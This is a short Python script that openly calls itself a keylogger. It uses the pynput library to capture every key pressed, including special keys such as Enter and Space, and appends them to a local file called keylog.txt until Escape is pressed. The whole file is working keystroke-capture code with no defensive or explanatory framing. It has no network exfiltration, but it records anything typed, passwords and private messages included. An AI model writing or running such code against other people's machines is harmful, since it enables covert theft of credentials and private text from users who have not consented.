from pynput import keyboard # type: ignore
import os
log_file = "keylog.txt"
def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f'{key.char}')
    except AttributeError:
        if key == keyboard.Key.space:
            with open(log_file, 'a') as f:
                f.write(' ')
        elif key == keyboard.Key.enter:
            with open(log_file, 'a') as f:
                f.write('\n')
        else:
            with open(log_file, 'a') as f:
                f.write(f'[{key.name}]')
def on_release(key):
    if key == keyboard.Key.esc:
        return False
def main():
    if not os.path.exists(log_file):
        with open(log_file, 'w') as f:
            f.write("Keylogger started...\n")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
if __name__ == "__main__":
    main()
